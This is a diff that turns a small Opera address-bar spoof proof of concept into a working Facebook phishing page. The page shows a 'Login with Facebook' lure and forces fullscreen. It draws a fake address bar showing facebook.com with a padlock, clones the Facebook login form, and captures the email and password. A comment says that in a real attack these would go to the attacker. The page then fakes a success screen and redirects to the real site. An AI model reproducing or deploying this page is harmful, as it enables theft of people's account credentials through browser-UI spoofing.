@@ -1,41 +1,170 @@
-
 <!DOCTYPE html>
-<html lang="en">
-    <head>
-        <title>Security UI Spoof</title>
-        <meta charset="utf-8">
-        <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
-        <style>
-            body {
-                margin: 0;
-                padding: 0;
-            }         
-            #spoof {
-                width:  100%;
-                height: 100%;
-            }
-        </style>
-        <script>
-         function x() {
-setTimeout(()=>{
+<html>
+<head>
+    <title>App Connect</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            background: #f0f2f5;
+        }
+        .initial-page {
+            text-align: center;
+            padding: 100px 20px;
+        }
+        .facebook-button {
+            cursor: pointer;
+            max-width: 300px;
+            transition: transform 0.2s;
+            margin: 30px 0;
+        }
+        .facebook-button:hover {
+            transform: scale(1.05);
+        }
+        .fake-address-bar {
+            background: #2d2d2d;
+            padding: 12px 20px;
+            border-bottom: 1px solid #555;
+            display: none;
+        }
+        .address-text {
+            color: white;
+            font-family: monospace;
+            font-size: 14px;
+            max-width: 600px;
+            margin: 0 auto;
+            display: flex;
+            align-items: center;
+        }
+        .lock-icon {
+            margin-right: 10px;
+            color: #00a400;
+        }
+    </style>
+</head>
+<body>
 
-                document.getElementById("spoof").style   = "display: block;";
-                document.getElementById("content").style = "display: none;";
-                document.documentElement.requestFullscreen();
+<!-- Initial Page -->
+<div class="initial-page" id="initialPage">
+    <h1>Connect Your Account</h1>
+    <p>Click below to login with Facebook and continue</p>
+    
+    <img class="facebook-button" 
+         src="https://scandiweb.com/blog/wp-content/uploads/2021/02/facebook-login-button-png-11.png" 
+         onclick="initiateSpoofing()">
+    
+    <p style="font-size: 12px; color: #666; margin-top: 50px;">
+        We use Facebook's secure authentication system
+    </p>
+</div>
 
-},500)
-            }
+<!-- Fake Address Bar -->
+<div class="fake-address-bar" id="fakeAddressBar">
+    <div class="address-text">
+        <span class="lock-icon">🔒</span>
+        https://www.facebook.com/login
+    </div>
+</div>
 
-        </script>
-    </head>  
-    <body>
-        <img id="spoof" style="display: none;" src="xa.jpg"></img>
-        <div id="content">
-            <br><br><br>
-            <center>
-                <h1>Navigate to Opera <a href=# onclick=x()>https://www.opera.com/</h1>
-            </center>
+<!-- Spoofed Content Area -->
+<div id="spoofedContent" style="display: none;">
+    <div style="max-width: 400px; margin: 50px auto; padding: 30px; background: white; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1);">
+        <div style="text-align: center; margin-bottom: 25px;">
+            <div style="color: #1877f2; font-size: 42px; margin-bottom: 10px;">f</div>
+            <h2 style="margin: 0; color: #1c1e21;">Log Into Facebook</h2>
+            <p style="color: #606770; margin: 10px 0;">To continue to App Connect</p>
         </div>
-    </body>
-  </body>
+        
+        <form onsubmit="captureCredentials(event)" style="margin-top: 20px;">
+            <input type="text" 
+                   placeholder="Email or phone number" 
+                   required
+                   style="width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; background: #f5f6f7;">
+            
+            <input type="password" 
+                   placeholder="Password" 
+                   required
+                   style="width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; background: #f5f6f7;">
+            
+            <button type="submit" 
+                    style="width: 100%; background: #1877f2; color: white; border: none; padding: 12px; border-radius: 6px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px;">
+                Log In
+            </button>
+        </form>
+        
+        <div style="text-align: center; margin-top: 20px;">
+            <a href="#" style="color: #1877f2; text-decoration: none; font-size: 14px;">Forgotten account?</a>
+        </div>
+    </div>
+</div>
+
+<script>
+    function initiateSpoofing() {
+        // 1. Sembunyikan initial page
+        document.getElementById('initialPage').style.display = 'none';
+        
+        // 2. Tampilkan fake address bar
+        document.getElementById('fakeAddressBar').style.display = 'block';
+        
+        // 3. Tampilkan spoofed content
+        document.getElementById('spoofedContent').style.display = 'block';
+        
+        // 4. Optional: Request fullscreen untuk immersive experience
+        if (document.documentElement.requestFullscreen) {
+            document.documentElement.requestFullscreen();
+        }
+        
+        // 5. Change page title untuk complete spoofing
+        document.title = "Facebook";
+    }
+
+    function captureCredentials(event) {
+        event.preventDefault();
+        const email = event.target[0].value;
+        const password = event.target[1].value;
+        
+        // Kirim credentials ke attacker (dalam real attack)
+        console.log('CAPTURED CREDENTIALS:', { 
+            email: email, 
+            password: password,
+            timestamp: new Date().toISOString()
+        });
+        
+        // Tampilkan fake success page
+        document.body.innerHTML = `
+            <div class="fake-address-bar">
+                <div class="address-text">
+                    <span class="lock-icon">🔒</span>
+                    https://www.facebook.com/login/success
+                </div>
+            </div>
+            <div style="min-height: 100vh; background: #f0f2f5; display: flex; align-items: center; justify-content: center;">
+                <div style="text-align: center; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); max-width: 400px;">
+                    <div style="color: #00a400; font-size: 48px; margin-bottom: 20px;">✅</div>
+                    <h2 style="color: #1c1e21; margin-bottom: 10px;">Login Successful</h2>
+                    <p style="color: #666;">You are now connected to Facebook</p>
+                    <p style="color: #999; font-size: 12px; margin-top: 20px;">Returning to application...</p>
+                </div>
+            </div>
+        `;
+        
+        // Redirect setelah beberapa detik
+        setTimeout(() => {
+            window.location.href = 'https://facebook.com/';
+        }, 3000);
+    }
+
+    // Auto-prompt setelah 10 detik
+    setTimeout(() => {
+        if (document.getElementById('initialPage').style.display !== 'none') {
+            document.body.innerHTML += `
+                <div style="position: fixed; top: 20px; right: 20px; background: #1877f2; color: white; padding: 12px 18px; border-radius: 6px; font-size: 14px; z-index: 1000; box-shadow: 0 2px 10px rgba(0,0,0,0.2);">
+                    🔐 Click "Login with Facebook" to continue
+                </div>
+            `;
+        }
+    }, 10000);
+</script>
+</body>
 </html>
